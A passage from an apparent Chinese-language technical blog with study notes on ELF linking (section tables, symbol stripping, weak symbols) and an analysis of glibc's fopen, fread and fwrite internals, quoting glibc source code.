<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>到了这里大概已经了解了汇编到链接的粗浅的过程，虽然没有看过源码的实现，但是也粗浅猜测一下，最重要的就是节表和elf头表，这两个表看起来可以定位elf中的所有元素，节中元素只需要考虑对节的相对偏移即可，接下来的每一步操作只要维护节表和头表即可，看到这里感觉字符串表完全是可以省略的东西，但是一想链接需要名字来识别，但是可执行文件估计就可以少了好多东西。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*可以看到是有字符串表的*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ab</span></span><br><span class="line">There are <span class="number">9</span> section headers, starting at offset <span class="number">0x3188</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .note.gnu.pr[...] NOTE             <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS         <span class="number">0000000000401000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">0000000000000084</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .eh_frame         PROGBITS         <span class="number">0000000000402000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS         <span class="number">0000000000404000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003004</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00003030</span></span><br><span class="line">       <span class="number">00000000000000</span>d8  <span class="number">0000000000000018</span>           <span class="number">7</span>     <span class="number">3</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">7</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">00003108</span></span><br><span class="line">       <span class="number">0000000000000032</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">0000313</span>a</span><br><span class="line">       <span class="number">000000000000004</span>d  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line"> <span class="comment">/*可以看到是有指令可以移除字符串表的，哎，安全行业堪忧*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># ld a.o b.o -e main -o ab -s</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ab</span></span><br><span class="line">There are <span class="number">7</span> section headers, starting at offset <span class="number">0x3070</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .note.gnu.pr[...] NOTE             <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS         <span class="number">0000000000401000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">0000000000000084</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .eh_frame         PROGBITS         <span class="number">0000000000402000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS         <span class="number">0000000000404000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003004</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">0000302f</span></span><br><span class="line">       <span class="number">000000000000003</span>d  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="关于common"><a href="#关于common" class="headerlink" title="关于common"></a>关于common</h2><blockquote>
<p>书中也讲了弱符号同名该如何处理，将了一种common块的知识，但是目前gcc貌似弃用了这玩意，直接在bind中表明这东西是弱符号。</p>
<p>fcommon选项都不起作用了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,week2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc  -nostdlib -fno-exceptions -fno-unwind-tables -fno-stack-protector -fcommon -c a.c -o a.o</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">10</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .rodata</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT  COM weak</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> strong</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  WEAK   DEFAULT    <span class="number">3</span> weak2</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000000008</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> week2</span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000000000</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>

<h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1><h2 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a><strong>重复代码消除</strong></h2><blockquote>
<p>非常高视角的讨论一下，有个印象</p>
</blockquote>
<p>c++的模板的实现，函数级别的链接，都涉及到代码的消除，否则会产生重定义的问题。具体的方法有，将不同函数放在不同的段，相同函数放在相同的段，链接的时候只保留一个。至于函数级别的链接，则涉及到无用函数的消除，但是会加大链接和汇编的成本。</p>
<h2 id="c-与ABI"><a href="#c-与ABI" class="headerlink" title="c++与ABI"></a><strong>c++与ABI</strong></h2><p>一句话来说是api是为了源码级别的兼容，在提供相应接口的os上，接口的行为是一样的。如posix标准，规定了一些列操作系统应该提供怎么样的接口的标准。而c库开发者若使用这些接口就很容易在不同的os上移植这些库。（粗显介绍）</p>
<p>至于ABI，则是应用二进制接口，就是不同的平台的二进制文件可以相互移植，基本上就是你windows的操作系统也可以处理linux的elf文件，看到这里，还是有点可能，毕竟这种文件格式的定义都是在c库中的实现，但是就算是文件结构可以合并到一起，又如何在一个机器上同时执行2种汇编代码呢？虚拟机吗？但是这不是兼容两种型号，是兼容多种型号，该如何实现？不知道了。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE函数分析</title>
    <url>/2024/08/14/IO-FILE%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><blockquote>
<p>在前人的基础上做一下总结和探索</p>
</blockquote>
<h2 id="执行链"><a href="#执行链" class="headerlink" title="执行链"></a>执行链</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__fopen_internal(iofopen.c)-&gt;_IO_no_init-&gt;  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">_IO_new_file_fopen-&gt;_IO_file_open</span><br></pre></td></tr></table></figure>

<h2 id="执行细节"><a href="#执行细节" class="headerlink" title="执行细节"></a>执行细节</h2><ul>
<li><p>标志位：</p>
<p>在执行过程中将oflags |omode作为系统调用的模式参数，read_write参数则作为flags传递个iofile结构体</p>
</li>
<li><p>光标定位（通过判断flag进行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">	&#123;</span><br><span class="line">	  __close_nocancel (fdesc);</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>总结来说，打开一个文件会先分配文件结构体，也就是iofile对象，之后会初始化iofile结构体，如一些flag的置位，虚表的赋值等等，然后会去处理用户输入的模式字段，来进行posix模式和flag的置位，也就是读，写，执行，追加。之后会利用系统调用open打开文件并返还文件描述符，最后完成文件结构的flag置位即可。</p>
<h2 id="亟待解决"><a href="#亟待解决" class="headerlink" title="亟待解决"></a>亟待解决</h2><p>宽字符处理</p>
<h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><h2 id="执行链-1"><a href="#执行链-1" class="headerlink" title="执行链"></a>执行链</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_fread(iofread.c)-&gt;_IO_file_xsgetn(fileops.c)-&gt;_IO_doallocbuf(genops.c)-&gt;_IO_file_doallocate(filedoalloc.c)-&gt;_IO_new_file_underflow(fileops.c)</span><br></pre></td></tr></table></figure>

<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><blockquote>
<p>1.判断有无缓冲区来分配缓冲区，如果没有缓冲区，会释放掉save缓冲区</p>
<p>2.维护一组指针来进行读操作，为：<code> _IO_read_end和_IO_read_ptr和_IO_read_base</code></p>
<p>3.总的来说就是如果缓冲区有数据，那么就把缓冲区中的数据copy到指定位置然后更新指针，然后通过判断剩余读写的数量来决定是把文件中的数据读到缓冲区中，还是直接通过系统调用来读取数据，也会判断是否需要刷新缓冲区。</p>
<p>4.主要的操作就是维护标志位和指针的位置，会有一些列安全检查。</p>
</blockquote>
<p><img src="/img/mypic/io/fread.png" alt="fread"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_switch_to_main_get_area (fp);</span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">	      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">	  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  count = want;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">		count -= want % block_size;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">	  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  s += count;</span><br><span class="line">	  want -= count;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a file buffer, or switch to unbuffered I/O.  Streams for</span></span><br><span class="line"><span class="comment">   TTY devices default to line buffered.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">stat64_t64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">	      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      local_isatty (fp-&gt;_fileno))</span><br><span class="line">	    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">	size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><blockquote>
<p>总结下来就是一件事，维护指针</p>
<p>首先分配缓冲区，得到bufbase，bufend，接下来就是向其中写入数据，并找准时机刷新，但是可能会因为不确定因素报错入：目标文件无法写入等等。</p>
<p>需要明白writebase，writeend，writeptr这一组指针是怎么维护的即可。</p>
<p>也有缓冲区过小直接调用系统调用的情形。。。。。。</p>
</blockquote>
<p>大神点评：</p>
<p>从图中可以看到<code>fwrite</code>的主要实现在<code>_IO_new_file_xsputn</code>中，整体流程包含四个部分：</p>
<ol>
<li>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝至输出缓冲区(一般第二次调用才会用上)。</li>
<li>如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用<code>_IO_OVERFLOW</code>建立输出缓冲区或刷新输出缓冲区。</li>
<li>输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size，如果超过块的size，则不通过输出缓冲区直接以块为单位，使用<code>new_do_write</code>输出目标数据。</li>
<li>如果按块输出数据后还剩下一点数据则调用<code>_IO_default_xsputn</code>将数据拷贝至输出缓冲区。</li>
</ol>
<p><img src="/img/mypic/io/fwrite.png" alt="fwrite"></p>
